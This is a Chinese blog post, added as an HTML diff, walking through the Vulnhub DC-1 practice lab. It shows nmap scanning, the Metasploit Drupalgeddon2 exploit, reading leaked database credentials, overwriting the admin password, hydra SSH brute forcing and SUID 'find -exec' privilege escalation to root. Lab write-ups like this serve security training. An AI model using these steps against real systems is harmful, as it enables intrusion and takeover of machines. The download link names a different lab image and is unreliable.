@@ -1,0 +1,361 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Vulnhub靶场-DC系列-DC_1 | 休比大王</title><meta name="author" content="xiubi"><meta name="copyright" content="xiubi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="曾与明月共白头 一轮春雨 一轮秋 就连誓言都腐朽">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub靶场-DC系列-DC_1">
+<meta property="og:url" content="https://xiubi1125.github.io/2025/11/18/Vulnhub%E9%9D%B6%E5%9C%BA-DC%E7%B3%BB%E5%88%97-DC_1/index.html">
+<meta property="og:site_name" content="休比大王">
+<meta property="og:description" content="曾与明月共白头 一轮春雨 一轮秋 就连誓言都腐朽">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiubi1125.github.io/img/dc1.jpg">
+<meta property="article:published_time" content="2025-11-18T10:44:56.861Z">
+<meta property="article:modified_time" content="2025-11-18T10:44:57.739Z">
+<meta property="article:author" content="xiubi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiubi1125.github.io/img/dc1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Vulnhub靶场-DC系列-DC_1",
+  "url": "https://xiubi1125.github.io/2025/11/18/Vulnhub%E9%9D%B6%E5%9C%BA-DC%E7%B3%BB%E5%88%97-DC_1/",
+  "image": "https://xiubi1125.github.io/img/dc1.jpg",
+  "datePublished": "2025-11-18T10:44:56.861Z",
+  "dateModified": "2025-11-18T10:44:57.739Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "xiubi",
+      "url": "https://xiubi1125.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/dancing.png"><link rel="canonical" href="https://xiubi1125.github.io/2025/11/18/Vulnhub%E9%9D%B6%E5%9C%BA-DC%E7%B3%BB%E5%88%97-DC_1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulnhub靶场-DC系列-DC_1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/1.css"><link rel="stylesheet" href="/css/2.css"><link rel="stylesheet" href="/css/3.css"><link rel="stylesheet" href="/css/4.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-categories-card/lib/categorybar.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="休比大王" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-image: url(/img/qz.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 老酒街</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw far fa-comments"></i><span> 夜雨</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/dc1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/dancing.png" alt="Logo"><span class="site-name">休比大王</span></a><a class="nav-page-title" href="/"><span class="site-name">Vulnhub靶场-DC系列-DC_1</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 老酒街</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw far fa-comments"></i><span> 夜雨</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub靶场-DC系列-DC_1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-18T10:44:56.861Z" title="发表于 2025-11-18 18:44:56">2025-11-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-18T10:44:57.739Z" title="更新于 2025-11-18 18:44:57">2025-11-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">靶场系列</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(/img/dc1.jpg);"></div><article class="container post-content" id="article-container"><hr>
+<h1 id="Vulnhub靶场-DC-DC-1"><a href="#Vulnhub靶场-DC-DC-1" class="headerlink" title="Vulnhub靶场-DC-DC_1"></a>Vulnhub靶场-DC-DC_1</h1><blockquote>
+<p>靶机下载地址<a target="_blank" rel="noopener" href="https://download.vulnhub.com/billu/Billu_b0x.zip">https://download.vulnhub.com/billu/Billu_b0x.zip</a></p>
+</blockquote>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118132102952.png" alt="image-20251118132102789"></p>
+<p>打开靶场发现需要登录</p>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.23.0/24  </span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118132342671.png" alt="image-20251118132342585"></p>
+<p>靶机地址为192.168.23.135</p>
+<p>探测端口</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118132544532.png" alt="image-20251118132544421"></p>
+<p>发现开放了22端口，开放了ssh服务，OpenSSH 6.0p1</p>
+<p>发现开放了80端口，存在web服务，Apache httpd 2.2.22，Drupal</p>
+<p>发现开放了111端口，开放了rpcbind服务</p>
+<p>先查看80端口</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118132635527.png" alt="image-20251118132635341"></p>
+<p>参考这个</p>
+<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51577576/article/details/127330202"> MSF使用实例 ] 利用永恒之黑采用正向连接 shell 获得主机权限(CVE-2020-0796)(SMBGhost)_msf正向shell-CSDN博客</a></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118134628539.png" alt="image-20251118134628239"></p>
+<p> <strong>Wappalyzer 插件</strong> 用于识别网站所使用的技术栈，它通过分析页面的代码、资源等信息，精准列出了该网站的 CMS、前端库和编程语言，是 Web 技术分析的常用工具。</p>
+<p>可以得到的信息</p>
+<p><strong>内容管理系统（CMS）</strong>：使用的是 <strong>Drupal 7</strong></p>
+<p>使用 <code>searchsploit drupal 7</code> 可以查询到 Drupal 7 版本的多个漏洞利用代码</p>
+<p>在 <code>searchsploit</code> 中可找到对应的利用脚本（如 <code>exploit/php/webapps/44449.rb</code>），结合 Metasploit 模块 <code>exploit/unix/webapp/drupal_drupalgeddon2</code> 可快速执行攻击。</p>
+<h5 id="使用MSF渗透"><a href="#使用MSF渗透" class="headerlink" title="使用MSF渗透"></a>使用MSF渗透</h5><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h5><p>搜索drupal7的漏洞</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal 7</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118152931484.png" alt="image-20251118152931039"></p>
+<p>进入 Metasploit 6 的交互控制台</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>search drupal</code> 来搜索 Drupal 相关的漏洞模块</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118153331973.png" alt="image-20251118153331729"></p>
+<p>使用编号1开始攻击 填写ip和端口</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118153440905.png" alt="image-20251118153440840"></p>
+<p>攻击成功</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118153542128.png" alt="image-20251118153542049"></p>
+<p>输入shell可以进入交互界面</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118153902063.png" alt="image-20251118153901997"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118153911934.png" alt="image-20251118153911688"></p>
+<blockquote>
+<p>cat flag1.txt<br>Every good CMS needs a config file - and so do you.</p>
+</blockquote>
+<p>打开发现提示信息，内容提示寻找站点的配置文件</p>
+<p>Drupal的默认配置文件为/var/www/sites/default/settings.php</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118154151243.png" alt="image-20251118154151042"></p>
+<p>拿到flag2和数据库信息</p>
+<blockquote>
+<p>flag2</p>
+<p>Brute force and dictionary attacks aren’t the</p>
+<p>only ways to gain access (and you WILL need access).</p>
+<p>What can you do with these credentials?</p>
+<p>暴力破解和字典攻击并非获取访问权限的唯一途径（而你肯定需要获得访问权限）。使用这些凭证你能做什么呢？</p>
+</blockquote>
+<blockquote>
+<p>$databases = array (<br>  ‘default’ =&gt;<br>  array (<br>    ‘default’ =&gt;<br>    array (<br>      ‘database’ =&gt; ‘drupaldb’,<br>      ‘username’ =&gt; ‘dbuser’,<br>      ‘password’ =&gt; ‘R0ck3t’,<br>      ‘host’ =&gt; ‘localhost’,<br>      ‘port’ =&gt; ‘’,<br>      ‘driver’ =&gt; ‘mysql’,<br>      ‘prefix’ =&gt; ‘’,<br>    ),</p>
+</blockquote>
+<h5 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h5><p>下一步登录数据库</p>
+<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’   //如果发现对方机器上有 python 的话</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118155148802.png" alt="image-20251118155148661"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118155217354.png" alt="image-20251118155217098"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users\G;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118180141977.png" alt="image-20251118180141656"></p>
+<p>可以看到这个密码是被加密的</p>
+<p>该密码不是普通的加密，有可能是网站自己的加密方式。尝试搜索一下相关文件</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118180555940.png" alt="image-20251118180555875"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118180708092.png" alt="image-20251118180707995"></p>
+<p>可以看到这是一个php的加密文件</p>
+<p>我们可以用这个脚本生成一个简单的密码 覆盖掉数据库中的密码</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118180806512.png" alt="image-20251118180806406"></p>
+<p>覆盖admin的密码</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118181114623.png" alt="image-20251118181114545"></p>
+<h5 id="登陆网站"><a href="#登陆网站" class="headerlink" title="登陆网站"></a>登陆网站</h5><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118181145482.png" alt="image-20251118181145263"></p>
+<p>成功登录</p>
+<p>简单查看一下看到flag3</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118181239312.png" alt="image-20251118181239110"></p>
+<blockquote>
+<p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
+<p>特殊的PERMS将有助于找到passwd-但您需要执行该命令以确定如何获取shadow中的内容。</p>
+</blockquote>
+<p>这句话提示需要利用<strong>特殊权限（SUID/SGID）</strong> 来找到密码相关信息，并且需要通过 <code>-exec</code> 命令来获取 <code>/etc/shadow</code> 中的内容（Linux 系统中存储用户加密密码的文件</p>
+<h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h5><p>flag3 提示中提到 “get what’s in the shadow”（获取 <code>/etc/shadow</code> 中的内容），而 <code>/etc/shadow</code> 是存储用户<strong>密码哈希</strong>的文件（只有 root 可直接访问）。要破解密码或提权，通常需要先结合 <code>/etc/passwd</code> 中的用户名，再去尝试读取 <code>/etc/shadow</code> 的哈希值。</p>
+<p>查看 <code>/etc/passwd</code> <strong>获取目标用户名列表</strong></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118183725574.png" alt="image-20251118183724928"></p>
+<p>发现 flag4，flag4是一个普通用户</p>
+<p>尝试读取他的家目录</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118183832504.png" alt="image-20251118183832439"></p>
+<blockquote>
+<p>Can you use this same method to find or access the flag in root?<br>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
+<p>你能用同样的方法找到或访问根目录下的 flag 吗？</p>
+<p>有可能。但也许没那么容易，又或者，其实很简单呢？</p>
+</blockquote>
+<p>服务器开放了 22 端口</p>
+<p>hydra工具爆破flag4用户的密码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/john/password.lst 192.168.23.135 ssh</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118184118689.png" alt="image-20251118184118601"></p>
+<p>密码为orange</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118184217074.png" alt="image-20251118184216834"></p>
+<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>常见的可用于 SUID 提权的文件有：</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find、bash、nmap、vim、more、less、nano、cp </span><br><span class="line">//当没有s权限时可以使用：chmod u+s 命令路径，增加权限</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查找哪些命令具备 SUID 标识</p>
+<p>相关命令：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看 suid 权限的可执行二进制程序</p>
+<p>find / -perm -4000 2&gt;/dev/null</p>
+<p>通过此命令寻找可利用的 SUID 程序，尝试提权</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118182838781.png" alt="image-20251118182838660"></p>
+<p>输出中明确包含 <code>/usr/bin/find</code>，且 <code>find</code> 具有 SUID 权限（所有者通常为 root），这意味着普通用户（如当前的 <code>www-data</code>）执行 <code>find</code> 时，会临时获得 root 权限。</p>
+<p>直接通过 <code>find</code> 的 <code>-exec</code> 参数调用 shell，获取 root 交互终端：</p>
+<h6 id="为什么选择-find？"><a href="#为什么选择-find？" class="headerlink" title="为什么选择 find？"></a>为什么选择 <code>find</code>？</h6><p>其他 SUID 程序（如 <code>su</code>、<code>passwd</code>）通常有严格的权限校验或功能限制，而 <code>find</code> 的 <code>-exec</code> 参数允许执行任意命令，且因 SUID 权限会以 root 身份运行，是最直接的提权方式。</p>
+<p>利用 find 命令随便查找一个正确的文件（夹）路径，后面加上 <code>-exec shell 命令 \;</code></p>
+<p>提权 <code>/bin/bash</code> 或者 <code>/bin/sh</code></p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@<span class="variable constant_">DC</span>-<span class="number">1</span>:<span class="regexp">/var/</span>www$ find cron.<span class="property">php</span> -exec <span class="string">"/bin/bash"</span> \;</span><br><span class="line">find cron.<span class="property">php</span> -exec <span class="string">"/bin/bash"</span> \;</span><br><span class="line">bash-<span class="number">4.2</span>$ find cron.<span class="property">php</span> -exec <span class="string">"/bin/sh"</span> \;  </span><br><span class="line">find cron.<span class="property">php</span> -exec <span class="string">"/bin/sh"</span> \;</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"># </span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118183311753.png" alt="image-20251118183311612"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20251118183432721.png" alt="image-20251118183432626"></p>
+<p>成功提权</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xiubi1125.github.io">xiubi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xiubi1125.github.io/2025/11/18/Vulnhub%E9%9D%B6%E5%9C%BA-DC%E7%B3%BB%E5%88%97-DC_1/">https://xiubi1125.github.io/2025/11/18/Vulnhub%E9%9D%B6%E5%9C%BA-DC%E7%B3%BB%E5%88%97-DC_1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xiubi1125.github.io" target="_blank">休比大王</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/dc1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/10/31/%E2%80%9C%5BNewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5DWEEK5--web%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%E2%80%9D/" title="“[NewStarCTF 2023 公开赛道]WEEK5--web方向复现记录”"><img class="cover" src="/img/new.jpg" onerror="onerror=null;src='/img/yu.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">“[NewStarCTF 2023 公开赛道]WEEK5--web方向复现记录”</div></div><div class="info-2"><div class="info-item-1">光阴坦荡若飞鸿雪泥 采撷传说里的相遇别离
+</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="avatar"></div><div class="author-info-name">xiubi</div><div class="author-info-description">或许最低落笔峰都能与光相逢</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">小小的不如意是在为大大的幸福做铺垫ദ്ദി˶ᕑᗢᓫ)✧</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnhub%E9%9D%B6%E5%9C%BA-DC-DC-1"><span class="toc-number">1.</span> <span class="toc-text">Vulnhub靶场-DC-DC_1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">渗透过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">1.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8MSF%E6%B8%97%E9%80%8F"><span class="toc-number">1.1.0.1.1.</span> <span class="toc-text">使用MSF渗透</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag1"><span class="toc-number">1.1.0.1.2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag3"><span class="toc-number">1.1.0.1.3.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E7%BD%91%E7%AB%99"><span class="toc-number">1.1.0.1.4.</span> <span class="toc-text">登陆网站</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag4"><span class="toc-number">1.1.0.1.5.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.0.1.6.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%80%89%E6%8B%A9-find%EF%BC%9F"><span class="toc-number">1.1.0.1.6.1.</span> <span class="toc-text">为什么选择 find？</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/18/Vulnhub%E9%9D%B6%E5%9C%BA-DC%E7%B3%BB%E5%88%97-DC_1/" title="Vulnhub靶场-DC系列-DC_1"><img src="/img/dc1.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="Vulnhub靶场-DC系列-DC_1"></a><div class="content"><a class="title" href="/2025/11/18/Vulnhub%E9%9D%B6%E5%9C%BA-DC%E7%B3%BB%E5%88%97-DC_1/" title="Vulnhub靶场-DC系列-DC_1">Vulnhub靶场-DC系列-DC_1</a><time datetime="2025-11-18T10:44:56.861Z" title="发表于 2025-11-18 18:44:56">2025-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/31/%E2%80%9C%5BNewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5DWEEK5--web%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%E2%80%9D/" title="“[NewStarCTF 2023 公开赛道]WEEK5--web方向复现记录”"><img src="/img/new.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="“[NewStarCTF 2023 公开赛道]WEEK5--web方向复现记录”"></a><div class="content"><a class="title" href="/2025/10/31/%E2%80%9C%5BNewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5DWEEK5--web%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%E2%80%9D/" title="“[NewStarCTF 2023 公开赛道]WEEK5--web方向复现记录”">“[NewStarCTF 2023 公开赛道]WEEK5--web方向复现记录”</a><time datetime="2025-10-31T05:53:54.938Z" title="发表于 2025-10-31 13:53:54">2025-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/28/%5BNewStarCTF%202025%5DWEEK3--web%E6%96%B9%E5%90%91wp/" title="“[NewStarCTF 2025]WEEK3--web方向wp”"><img src="/img/newstar5.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="“[NewStarCTF 2025]WEEK3--web方向wp”"></a><div class="content"><a class="title" 